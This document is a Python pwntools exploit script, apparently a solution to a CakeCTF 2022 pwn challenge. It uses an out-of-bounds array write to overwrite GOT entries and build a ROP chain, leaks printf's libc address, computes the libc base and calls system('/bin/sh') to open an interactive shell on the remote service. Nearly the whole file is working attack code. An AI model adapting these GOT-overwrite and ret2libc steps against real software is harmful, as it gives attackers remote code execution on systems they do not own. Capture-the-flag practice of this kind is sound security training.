from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "pwn1.2022.cakectf.com"
    port = 9002
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)


def wsize(size):
    recvuntil(b"size:")
    sendline(str(size).encode("ascii"))

def windex(ind):
    recvuntil(b"index:")
    sendline(str(ind).encode("ascii"))

def wvalue(ind):
    recvuntil(b"value:")
    sendline(str(ind).encode("ascii"))

def set(idx, v):
    windex(idx)
    wvalue(v)

if is_gaibu:
    libc_offset = 0x3fc90 # __printf
    system_offset = 0x30290
else:
    libc_offset = 0x3fc90
    system_offset = 0x30290

'''
0000000000404018 R_X86_64_JUMP_SLOT  setbuf@GLIBC_2.2.5
0000000000404020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404028 R_X86_64_JUMP_SLOT  alarm@GLIBC_2.2.5
0000000000404030 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7
0000000000404038 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
---
0000000000404050 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000404060 R_X86_64_COPY     stdin@@GLIBC_2.2.5
'''
setbuf_offset = 0
exit_offset = 4
stdout_offset = 7
binsh_offset = 13

main_addr = 0x4011b6
entrypoint = 0x4010d0
got_base = 0x404018
plt_printf = 0x401090
stdin_addr = 0x404060
binshaddr = got_base + binsh_offset * 8

pop_rdi = 0x004013e3
ret = 0x0040101a
got_printf = 0x404020
pop6_ret = 0x004013da

wsize(5)


set(4, 20)

'''
0000| 0x7ffcc9c47850 --> 0x401380 (<__libc_csu_init>:	endbr64)
0008| 0x7ffcc9c47858 --> 0x7fe5ac299190 --> 0x0
0016| 0x7ffcc9c47860 --> 0x3
0024| 0x7ffcc9c47868 --> 0x4011fa (<main+68>:	cmp    eax,0x1)
0032| 0x7ffcc9c47870 --> 0xa ('\n')
0040| 0x7ffcc9c47878 --> 0x0
0048| 0x7ffcc9c47880 --> 0x7ffcc9c47850 --> 0x401380 (<__libc_csu_init>:	endbr64)
0056| 0x7ffcc9c47888 --> 0xe0f91826ab138b00
'''

# rop
set(0, pop_rdi)
set(1, pop_rdi)
set(2, pop6_ret)

set(9, pop_rdi)
set(10, got_printf)
set(11, ret)
set(12, plt_printf)
set(13, entrypoint)

# overwrite got
set(6, got_base)
#set(setbuf_offset, plt_printf)
set(exit_offset, pop_rdi)
set(binsh_offset, u64(b"/bin/sh\x00"))

wait_for_attach()
windex(21)  # triggers exit(= ROP)


s = recvuntil(b"size: ")
print(s)
libc_base = just_u64(s) - libc_offset
print(hex(libc_base))
sendline(b"5")

set(4, 20)
set(0, pop_rdi)
set(1, binshaddr)
set(2, libc_base + system_offset)
windex(21)

interactive()
